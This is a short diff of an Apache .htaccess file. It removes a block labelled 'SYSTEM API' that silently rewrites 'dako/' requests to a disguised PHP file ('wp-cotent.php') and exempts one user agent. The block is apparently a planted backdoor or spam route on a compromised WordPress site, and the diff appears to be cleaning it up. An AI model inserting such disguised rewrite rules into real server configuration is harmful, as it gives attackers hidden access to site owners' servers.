@@ -1,13 +1,3 @@
-# BEGIN SYSTEM API
-RewriteEngine on
-RewriteBase /
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteCond %{HTTP_USER_AGENT} !myclearcode$ [NC]
-RewriteRule ^dako/(.*)$ telepresence/old/wp-cotent.php?$1 [L]
-
-# END SYSTEM API
-
 <IfModule mod_expires.c>
     ExpiresActive On
     ExpiresByType text/css A31536000
